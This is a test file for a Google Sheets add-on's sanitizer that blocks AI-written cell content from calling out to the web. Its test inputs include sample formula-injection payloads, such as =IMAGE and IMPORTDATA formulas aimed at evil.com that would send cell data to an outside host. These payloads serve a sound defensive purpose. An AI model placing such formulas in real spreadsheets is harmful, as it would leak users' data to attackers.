/**
 * Tests for src/server/safe-writes.ts — the only sanctioned path for writing
 * untrusted-origin content to a Sheets cell. See T6 in the threat model.
 */

import { sanitizeForCell, writeSafeValue } from "../src/server/safe-writes";

describe("sanitizeForCell", () => {
  const REJECTION_MSG =
    "[SSI Error: AI response contained an external request formula — output rejected]";

  it("rejects =IMAGE formula (exfiltrates cell data via image URL)", () => {
    expect(sanitizeForCell('=IMAGE("https://evil.com/?d="&A1)')).toBe(REJECTION_MSG);
  });

  it("rejects +IMPORTDATA formula (fetches external URL via + prefix)", () => {
    expect(sanitizeForCell("+IMPORTDATA(A1)")).toBe(REJECTION_MSG);
  });

  it("rejects -IMPORTXML formula", () => {
    expect(sanitizeForCell('-IMPORTXML(A1, "//b")')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTHTML formula", () => {
    expect(sanitizeForCell('=IMPORTHTML("http://evil.com", "table", 1)')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTRANGE formula", () => {
    expect(sanitizeForCell('=IMPORTRANGE("spreadsheetId", "A1:A10")')).toBe(REJECTION_MSG);
  });

  it("rejects =IMPORTFEED formula", () => {
    expect(sanitizeForCell('=IMPORTFEED("http://evil.com/rss")')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function nested inside another formula", () => {
    expect(sanitizeForCell('=IF(1=1,IMAGE("evil.com"),0)')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function nested inside IFERROR", () => {
    expect(sanitizeForCell('=IFERROR(IMPORTDATA("http://evil.com"),0)')).toBe(REJECTION_MSG);
  });

  it("rejects web-fetch function name regardless of case", () => {
    expect(sanitizeForCell('=image("evil.com")')).toBe(REJECTION_MSG);
  });

  it("prepends apostrophe to non-web-fetch formula starting with =", () => {
    expect(sanitizeForCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
  });

  it("prepends apostrophe to non-web-fetch formula starting with - (defense-in-depth)", () => {
    expect(sanitizeForCell("-SUM(A1:A10)")).toBe("'-SUM(A1:A10)");
  });

  it("prepends apostrophe to non-web-fetch formula starting with +", () => {
    expect(sanitizeForCell("+SUM(A1:A10)")).toBe("'+SUM(A1:A10)");
  });

  it("leaves normal AI response text unchanged", () => {
    expect(sanitizeForCell("The subject appeared in three court filings.")).toBe(
      "The subject appeared in three court filings.",
    );
  });

  it("leaves empty string unchanged", () => {
    expect(sanitizeForCell("")).toBe("");
  });

  it("leaves values with leading whitespace unchanged (Sheets does not evaluate as formula)", () => {
    expect(sanitizeForCell("  =not evaluated as formula")).toBe("  =not evaluated as formula");
  });

  it("preserves the full response when prepending apostrophe to a safe multiline formula", () => {
    const input = "=SUM(A1:A10)\nNote: this formula sums the range";
    expect(sanitizeForCell(input)).toBe(`'${input}`);
  });
});

describe("writeSafeValue", () => {
  it("writes a safe string value to the range unchanged", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, "hello");
    expect(setValueMock).toHaveBeenCalledWith("hello");
  });

  it("rejects a web-fetch formula", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, '=IMAGE("evil.com")');
    expect(setValueMock).toHaveBeenCalledWith(
      "[SSI Error: AI response contained an external request formula — output rejected]",
    );
  });

  it("literal-izes a non-web-fetch formula", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, "=SUM(A1:A10)");
    expect(setValueMock).toHaveBeenCalledWith("'=SUM(A1:A10)");
  });

  it("passes non-string values through unchanged (numbers can never be a sheet function)", () => {
    const setValueMock = jest.fn();
    const range = { setValue: setValueMock } as unknown as GoogleAppsScript.Spreadsheet.Range;
    writeSafeValue(range, 42);
    expect(setValueMock).toHaveBeenCalledWith(42);
  });
});
